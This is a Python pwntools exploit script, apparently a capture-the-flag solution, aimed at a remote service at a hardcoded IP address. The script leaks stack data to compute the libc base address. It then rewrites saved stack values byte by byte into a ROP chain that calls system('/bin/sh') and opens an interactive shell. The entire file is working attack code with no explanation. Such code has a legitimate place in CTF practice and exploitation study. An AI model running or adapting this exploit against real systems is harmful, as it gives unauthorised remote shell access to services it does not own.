import pwn

pwn.context.terminal = ['tmux', 'splitw', '-h']

r = pwn.remote('34.170.104.126',5000)

pop_rdi_ret = 0x2a873 # : pop rdi; ret; 
system = 0x58740 # system
binsh = 0x1cb42f # /bin/sh\x00 string offset

def leak_stack(): 
    payload = [-15] + [0x18] * (0x100 - 0xbc + 0xa8)
    payload = [x & 0xFF for x in payload]

    pwn.sleep(0.5)
    r.send(bytes(payload))

    leak = b''
    for i in range(100000):
        part = r.recv(1024, timeout = 0.5)
        leak += part

        if len(part) == 0:
            break

    buffer = []

    for i in range(256):
        buffer.append(leak.count(i))

    data = bytes(buffer)
    return data


def set_byte(offset, value):
    payload = [-15] + [0x18] * (0x100 - 0xbc + 0xa8) + [0x28 + offset] * value
    payload = [x & 0xFF for x in payload]

    assert len(payload) < 512

    pwn.sleep(0.2)

    r.send(bytes(payload))

    leak = b''
    for i in range(100000):
        part = r.recv(1024, timeout = 0.2)
        leak += part

        if len(part) == 0:
            break

    print(f'[{offset}] => {hex(value)} ({len(payload)})')

leaked = leak_stack()
stack_values = [
    pwn.u64(leaked[40:48]),
    pwn.u64(leaked[48:56]),
    pwn.u64(leaked[56:64]),
    pwn.u64(leaked[64:72]),
]

libc_base = pwn.u64(leaked[40:48]) - 0x2a1ca
print(f'libc_base @ 0x{libc_base:x}')

target_values = [
    libc_base + pop_rdi_ret,
    libc_base + binsh,
    0x00,
    libc_base + system,
]

for i in range(len(target_values)):
    stack = stack_values[i]
    target = target_values[i]

    for k in range(8):
        value1 = (0x100 - ((stack >> (k*8)) & 0xFF)) & 0xFF
        print(f'setting byte {i}*8 + {k} to {hex(value1)}')
        set_byte(i*8 + k, value1)
        value2 = (target >> (k*8)) & 0xFF
        print(f'setting byte {i}*8 + {k} to {hex(value2)}')
        set_byte(i*8 + k, value2)

r.interactive()
